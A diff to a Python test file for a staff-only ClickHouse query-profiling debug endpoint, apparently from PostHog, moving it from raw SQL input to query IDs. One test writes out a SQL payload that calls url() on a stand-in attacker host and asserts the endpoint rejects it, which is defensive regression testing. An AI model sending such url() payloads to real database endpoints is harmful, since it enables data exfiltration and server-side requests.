@@ -34,30 +34,55 @@ class TestDebugCHQueryProfile(APIBaseTest):
     def test_non_staff_gets_403(self):
         self.user.is_staff = False
         self.user.save()
-        resp = self.client.post("/api/debug_ch_queries/profile/", {"query": "SELECT 1"}, format="json")
+        resp = self.client.post("/api/debug_ch_queries/profile/", {"query_id": "abc"}, format="json")
         self.assertEqual(resp.status_code, HTTP_403_FORBIDDEN)
 
-    def test_rejects_empty_query(self):
+    def test_rejects_empty_query_id(self):
         self.user.is_staff = True
         self.user.save()
-        resp = self.client.post("/api/debug_ch_queries/profile/", {"query": ""}, format="json")
+        resp = self.client.post("/api/debug_ch_queries/profile/", {"query_id": ""}, format="json")
         self.assertEqual(resp.status_code, HTTP_400_BAD_REQUEST)
 
-    @patch("posthog.api.debug_ch_queries.get_client_from_pool")
-    def test_returns_profile_query_id(self, mock_get_client):
+    def test_ignores_raw_query_field(self):
         self.user.is_staff = True
         self.user.save()
+        resp = self.client.post(
+            "/api/debug_ch_queries/profile/",
+            {"query": "SELECT * FROM url('https://attacker/', 'CSV', 'x String')"},
+            format="json",
+        )
+        self.assertEqual(resp.status_code, HTTP_400_BAD_REQUEST)
+
+    @patch("posthog.api.debug_ch_queries.sync_execute")
+    def test_rejects_unknown_query_id(self, mock_sync_execute):
+        self.user.is_staff = True
+        self.user.save()
+        mock_sync_execute.return_value = []
+
+        resp = self.client.post("/api/debug_ch_queries/profile/", {"query_id": "unknown"}, format="json")
+        self.assertEqual(resp.status_code, HTTP_400_BAD_REQUEST)
+
+    @patch("posthog.api.debug_ch_queries.sync_execute")
+    @patch("posthog.api.debug_ch_queries.get_client_from_pool")
+    def test_returns_profile_query_id(self, mock_get_client, mock_sync_execute):
+        self.user.is_staff = True
+        self.user.save()
+
+        mock_sync_execute.return_value = [("SELECT 1",)]
 
         mock_client = MagicMock()
         mock_get_client.return_value.__enter__ = MagicMock(return_value=mock_client)
         mock_get_client.return_value.__exit__ = MagicMock(return_value=False)
 
-        resp = self.client.post("/api/debug_ch_queries/profile/", {"query": "SELECT 1"}, format="json")
+        resp = self.client.post("/api/debug_ch_queries/profile/", {"query_id": "abc123"}, format="json")
         self.assertEqual(resp.status_code, HTTP_200_OK)
         data = resp.json()
         self.assertIn("profile_query_id", data)
         self.assertIn("execution_time_ms", data)
         self.assertTrue(data["profile_query_id"].startswith("profile_"))
+
+        executed_sql = mock_client.execute.call_args.args[0]
+        self.assertEqual(executed_sql, "SELECT 1")
 
 
 class TestDebugCHQueryProfileResults(APIBaseTest):
